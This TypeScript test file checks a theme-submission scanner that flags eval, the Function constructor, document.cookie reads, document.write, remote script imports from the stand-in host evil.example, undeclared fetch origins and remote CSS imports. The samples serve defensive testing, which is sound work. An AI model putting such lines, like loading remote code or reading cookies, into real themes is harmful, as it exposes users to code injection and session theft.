import { describe, test } from "node:test";
import assert from "node:assert/strict";
import { bundledThemes } from "./registry";
import { checkTheme } from "./checks";
import type { ThemePackage } from "./package";

const withJs = (source: string, connect: string[] = []): ThemePackage => {
  const base = structuredClone(bundledThemes()[0]!);
  return { ...base, manifest: { ...base.manifest, permissions: { connect } }, blockJs: { demo: source }, blockCss: {}, baseCss: "body{color:red}" };
};
const rules = (theme: ThemePackage) => checkTheme(theme).map((f) => f.rule);

describe("theme submission checks (#68)", () => {
  test("every bundled first-party theme passes", () => {
    for (const theme of bundledThemes()) assert.deepEqual(checkTheme(theme), [], theme.manifest.name);
  });

  test("flags eval, the Function constructor, document.cookie and document.write", () => {
    assert.deepEqual(rules(withJs("eval('1')")), ["no-eval"]);
    assert.deepEqual(rules(withJs("new Function('return 1')")), ["no-new-function"]);
    assert.deepEqual(rules(withJs("const c = document.cookie")), ["no-document-cookie"]);
    assert.deepEqual(rules(withJs("document.write('x')")), ["no-document-write"]);
  });

  test("flags remote and computed dynamic imports, but not a local literal", () => {
    assert.deepEqual(rules(withJs("import('https://evil.example/x.js')")), ["no-remote-import", "undeclared-origin"]);
    assert.deepEqual(rules(withJs("import(url)")), ["no-remote-import"]);
    assert.deepEqual(rules(withJs("import x from 'https://evil.example/x.js'")), ["no-remote-import", "undeclared-origin"]);
    assert.deepEqual(rules(withJs("import('./other.js')")), []);
  });

  test("a call to an origin the manifest does not declare is refused; a declared one is fine", () => {
    assert.deepEqual(rules(withJs("fetch('https://api.example.com/v1')")), ["undeclared-origin"]);
    assert.deepEqual(rules(withJs("fetch('https://api.example.com/v1')", ["https://api.example.com"])), []);
    assert.deepEqual(rules(withJs("const ns = 'http://www.w3.org/2000/svg'")), []);
  });

  test("flags CSS @import and remote url()", () => {
    const theme = withJs("");
    theme.baseCss = "@import url('https://fonts.example/x.css'); a{background:url(https://cdn.example/i.png)}";
    assert.deepEqual(rules(theme), ["no-css-import", "no-remote-css-url", "no-remote-css-url"]);
  });
});
